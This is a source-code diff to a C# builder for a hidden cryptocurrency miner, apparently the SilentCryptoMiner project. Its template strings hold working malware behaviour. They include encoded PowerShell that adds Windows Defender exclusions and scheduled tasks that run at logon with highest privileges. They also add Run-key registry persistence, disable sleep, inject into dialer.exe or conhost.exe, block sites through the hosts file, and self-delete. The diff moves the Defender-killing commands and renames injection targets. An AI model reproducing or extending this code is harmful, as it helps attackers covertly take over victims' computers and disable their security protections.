@@ -15,8 +15,7 @@ namespace SilentCryptoMiner
     public class Codedom
     {
         public static Builder F;
-        public static string killWDCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionPath @($env:UserProfile,$env:SystemDrive) -Force"))}\" & powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionExtension @('exe','dll') -Force"))}\" & exit";
-
+        
         public static bool MinerCompiler(string savePath, string code, string iconPath = "", bool requireAdministrator = false)
         {
             var providerOptions = new Dictionary<string, string>();
@@ -366,13 +365,13 @@ namespace SilentCryptoMiner
                 sb.Replace("#SHELLCODE", shellcode);
                 sb.Replace("#ARGS", args);
                 CipherReplace(sb, "#ENV", "SystemRoot");
-                CipherReplace(sb, "#TARGET", F.toggleRootkit.Checked ? "System32\\nslookup.exe" : "System32\\conhost.exe");
+                CipherReplace(sb, "#TARGET", F.toggleRootkit.Checked ? "System32\\dialer.exe" : "System32\\conhost.exe");
                 CipherReplace(sb, "#FORMAT1", @"%s\%s");
                 CipherReplace(sb, "#FORMAT2", "\"%s\" \"%s\"");
                 if (F.toggleKillWD.Checked)
                 {
                     sb.Replace("DefKillWD", "TRUE");
-                    CipherReplace(sb, "#KILLWD", killWDCommands);
+                    CipherReplace(sb, "#KILLWD", F.killWDCommands);
                 }
                 File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
                 RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
@@ -484,7 +483,7 @@ namespace SilentCryptoMiner
             if (F.toggleKillWD.Checked)
             {
                 stringb.Replace("DefKillWD", "true");
-                stringb.Replace("#KillWDCommands", F.EncryptString(killWDCommands));
+                stringb.Replace("#KillWDCommands", F.EncryptString(F.killWDCommands));
             }
 
             if (F.toggleRootkit.Checked)
@@ -587,7 +586,7 @@ namespace SilentCryptoMiner
             stringb.Replace("#XID", F.EncryptString(F.xid));
             stringb.Replace("#EID", F.EncryptString(F.eid));
             stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"));
-            stringb.Replace("#TASKSCH", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest /ru \"System\" /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
+            stringb.Replace("#TASKSCH", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
             stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /F /D \"{{0}}\""));
             stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
             stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
@@ -598,7 +597,7 @@ namespace SilentCryptoMiner
             stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID \"{0}\""));
             stringb.Replace("#CMDDELETE", F.EncryptString("cmd /c choice /C Y /N /D Y /T 3 & Del \"{0}\""));
             stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
-            stringb.Replace("#NSLOOKUP", F.EncryptString("System32\\nslookup.exe"));
+            stringb.Replace("#DIALER", F.EncryptString("System32\\dialer.exe"));
             stringb.Replace("#HOSTSPATH", F.EncryptString("drivers/etc/hosts"));
             stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n127.0.0.1       {0}"));
 
